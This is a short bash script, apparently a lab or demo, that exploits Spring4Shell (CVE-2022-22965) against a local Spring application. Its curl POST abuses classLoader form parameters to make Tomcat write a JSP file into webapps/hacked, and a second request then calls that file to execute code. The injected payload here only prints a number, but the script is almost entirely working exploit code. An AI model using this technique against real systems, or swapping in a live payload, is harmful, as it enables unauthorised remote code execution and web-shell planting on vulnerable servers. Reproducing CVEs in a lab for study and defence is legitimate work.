#!/usr/bin/env bash 
NC=$'\e[0m' # No Color
BOLD=$'\033[1m'
UNDERLINE=$'\033[4m'
RED=$'\e[31m'
GREEN=$'\e[32m'
BLUE=$'\e[34m'
ORANGE=$'\x1B[33m'

HOST="http://localhost:8080/"
API_ENDPOINT="spring4shell/kudos"

function log_result() {
  EXIT_CODE="$1"
  MESSAGE="$2"
  if [[ -n "$EXIT_CODE" && "$EXIT_CODE" -eq 0 ]]; then
    echo -e "$MESSAGE | Success ✅"
  else
    echo -e "$MESSAGE | Failed ❌"
  fi
}

echo -e "\n${BOLD}Start CVE-2022-22965 Vulnerability Exploitation ${NC}"
curl  -s -X POST \
  -H "pre:<%" \
  -H "post:;%>" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/hacked' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=index' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8080/spring4shell/kudos  > /dev/null
EXIT_CODE="$?"
log_result "$EXIT_CODE" "\nSpring4Shell CVE-2022-22965 Vulnerability Exploitation"

echo -e "\n${RED}${BOLD}Invoking Remote Code Execution${NC}"
curl http://localhost:8080/hacked/index.jsp
EXIT_CODE="$?"
log_result "$EXIT_CODE" "\nSpring4Shell Remote Code Execution"